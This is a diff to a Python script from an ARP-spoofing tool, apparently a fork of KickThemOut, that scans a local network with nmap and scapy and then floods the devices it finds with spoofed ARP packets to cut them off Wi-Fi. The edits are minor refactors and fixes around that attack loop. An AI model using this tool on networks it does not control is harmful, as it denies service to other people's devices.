@@ -3,7 +3,6 @@
 import time, os, sys, logging, math
 from datetime import timedelta
 from time import sleep
-import ipaddress
 import R_spoof
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
@@ -11,14 +10,14 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
 try:
     from scapy.all import *
     import nmap
-except:
+except ImportError:
     print("\n{0}ERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.".format(RED))
     print("\n{0}If you still cannot resolve this error, please submit an issue here:\n\t{1}https://github.com/R3DDY97/K1CK_them_0UT3/issues\n{2}".format(RED, BLUE, END))
     raise SystemExit
 
 # check whether user is root
 if os.geteuid() != 0:
-    print("\n{0}ERROR: K1CKThemOut3 must be run with root privileges. Try again with sudo:\n\t{1}$ sudo python3 L0CK.py{2}\n".format(RED, GREEN, END))
+    print("\n{0}ERROR: K1CKThemOut3 must be run with root privileges. Try again with sudo:\n\t{1}$ sudo python3 kick.py{2}\n".format(RED, GREEN, END))
     raise SystemExit
 
 
@@ -76,7 +75,7 @@ def net_config():
     defaultGatewayMac = getmacbyip(defaultGatewayIP).upper()
     gateway = route_list[-1][0]
     for i in routing:
-        if int(ipaddress.IPv4Address(gateway)) in i:
+        if int(utils.ipaddress.IPv4Address(gateway)) in i:
             netmask = 32 - int(round(math.log(0xFFFFFFFF - (i[1]), 2)))
     GatewayInterface = "{}/{}".format(defaultGatewayIP,netmask)
 
@@ -93,10 +92,11 @@ def scanNetwork():
     IPlist = nm.all_hosts()
     IPlist.remove(defaultInterfaceIP)
     IPlist.remove(defaultGatewayIP)
-    try:
-        macList = [getmacbyip(ip).upper() for ip in IPlist]
-    except AttributeError:
-        macList = [nm[x]['addresses']['mac'] for x in IPlist]
+    # try:
+    #     macList = [getmacbyip(ip).upper() for ip in IPlist]
+    # except AttributeError:
+    #     macList = [nm[x]['addresses']['mac'] for x in IPlist]
+    macList = [nm[x]['addresses']['mac'] for x in IPlist]
 
     hostname_list = [nm[x]['hostnames'][0]['name'] for x in IPlist]
     vendorList = [nm[x]['vendor'][m] for x,m in zip(IPlist,macList)]
@@ -211,7 +211,7 @@ def K1CKalloff():
     for n,i in enumerate(imv,1):
         print(" {0}[{5}]\t{1}{6}\t{2}{7}\t{3}{8}{4}".format(YELLOW, WHITE, RED, GREEN, END,n,i[0],i[1],i[2]))
     print("\n\t {0}SP00FING has started...& Press CTRL+C keys to stop it {1}\n".format(BLUE, END))
-    print("\n \t {0}K1CK3D ALL  0UT 0F Wifi{1}\n".format(RED,END))
+    print("\n \t {0}K1CK3D ALL  0UT 0F Wifi{1}\n".format(RED, END))
     try:
         # broadcast malicious ARP packets (10p/s)
         start = time.time()
@@ -220,7 +220,7 @@ def K1CKalloff():
             for i in imv:
                 R_spoof.sendPacket(defaultInterfaceMAC, defaultGatewayIP, i[0], i[1])
                 elapsed = timedelta(seconds = round(time.time() - start))
-            print("\r \t {0}ATT4CK DUR4T10N :- {1} seconds{2}".format(YELLOW,elapsed,END),end="")
+            print("\r\t{0}ATT4CK DUR4T10N :- {1} seconds{2}".format(YELLOW,elapsed,END),end="")
             reScan += 1
             if reScan == 4:
                 reScan = 0
